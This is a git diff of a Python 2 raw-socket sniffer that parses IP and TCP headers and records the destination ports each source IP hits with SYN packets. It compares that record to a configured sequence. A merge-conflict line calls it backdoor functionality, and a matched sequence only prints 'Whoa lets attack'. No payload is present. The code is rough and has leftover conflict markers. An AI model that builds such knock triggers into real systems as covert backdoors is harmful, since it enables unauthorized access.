@@ -1,19 +1,43 @@
-<<<<<<< HEAD
 #!/usr/bin/env python2.7
 import sys
 import socket
 import struct
 
+hashmap = {}
+
 def readConfig(configuration_file = "configuration-file"):
 	portlist = []
 	try:
 		with open(configuration_file, 'r') as f:
-    			portlist = [line.strip() for line in f]
+    			portlist = [int(line.strip()) for line in f]
 	except:
 		print "Error reading config file named configuration-file \n Exiting .."
 		sys.exit()
 	return portlist
 
+
+def logic(host_port):
+	"""
+	We have host_port in format (sourceip, destinationport) for TCP SYN packets only - 
+	Using hashmap to store it and perform necessary action when correct sequence hit 
+	"""
+	global hashmap 
+	portlist = readConfig()
+	if host_port[1] in portlist:
+		# Port number exists in port List
+		if host_port[0] in hashmap:
+			#print hashmap[host_port[0]]
+			hashmap[host_port[0]].append(host_port[1])
+		else:
+			hashmap[host_port[0]] = [host_port[1]] 
+	
+		print hashmap
+	
+		if hashmap[host_port[0]] == portlist :
+			print ("Whoa lets attack")
+	
+	else : 
+		print host_port[1] ,"not in ",  portlist
 
 
 def run(portlist):
@@ -29,11 +53,43 @@ def run(portlist):
 		#IP Header
 		IPHeader = data[:20]
 		
+		unpackedHeader = struct.unpack('!BBHHHBBH4s4s' ,IPHeader)
+		
+		#unpackedHeader[0] -> Version+IP header Length
+		ihl = unpackedHeader[0] & 0xF
+		ipHeaderLength = ihl * 4 
 	
+		#Source Address is 8th field to distinguish hosts
 
+		source_address = socket.inet_ntoa(unpackedHeader[8]);
+		#print "source_address  = ", source_address
+			
+		#Since we  are reading only TCP packets , I am not checking for PROTOCOL field in IP Header
+		
+		#Next Header after ipHeaderLength is 20 byte TCP Header and SYN packets dont have data
 
+		TCPHeader = data [ipHeaderLength:ipHeaderLength + 20 ]
+		
+		unpackedTCPHeader = struct.unpack('!HHLLBBHHH' , TCPHeader )
+
+		source_port = unpackedTCPHeader[0]
+		destination_port = unpackedTCPHeader[1]
+
+		flags = unpackedTCPHeader[5]  # CWR; ECE ;URG ;ACK ;PSH ; RST ; SYN ; FIN 
+		
+		#print "flags = " , flags
+
+		syn_bit = ( flags >> 1 ) & 1 
+		
+		#print "syn_bit = " ,syn_bit
+
+		if ( syn_bit != 1 ) :
+			return ()
+		
+		#print source_port, destination_port , flags , syn_bit  #1234 9007 2 1
 		port = 8766
-		return (packet[1][0],port)	
+		#return (packet[1][0],port)	
+		return (source_address,destination_port)
 
 	
 
@@ -49,7 +105,9 @@ def run(portlist):
 		host_port =  parsePacket(packet)
 		
 		if host_port:
-			print host_port
+			#This means the packet is TCP SYN let's deal with this to save in hash map to carry the attack
+
+			logic(host_port)
 	
 
 if __name__ == "__main__":
@@ -62,5 +120,3 @@ if __name__ == "__main__":
 
 
 
-=======
->>>>>>> parent of ec955db... Added backdoor simple functionality to sniff packets
